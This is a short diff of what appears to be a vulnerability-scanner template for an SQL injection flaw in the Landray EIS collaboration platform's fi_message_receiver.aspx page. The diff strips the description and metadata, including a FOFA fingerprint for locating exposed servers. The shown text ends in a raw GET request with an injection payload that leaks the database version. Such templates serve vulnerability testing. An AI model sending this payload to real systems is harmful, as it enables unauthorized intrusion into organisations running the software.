@@ -3,12 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台 fi_message_receiver.aspx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gfi7pgf00bdkaxgd'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gfi7pgf00bdkaxgd
-    fofa: body="/Scripts/jquery.landray.dialog.js"
 http:
 - raw:
   - 'GET /Message/fi_message_receiver.aspx?replyid=1%20and%201=@@version--+ HTTP/1.1
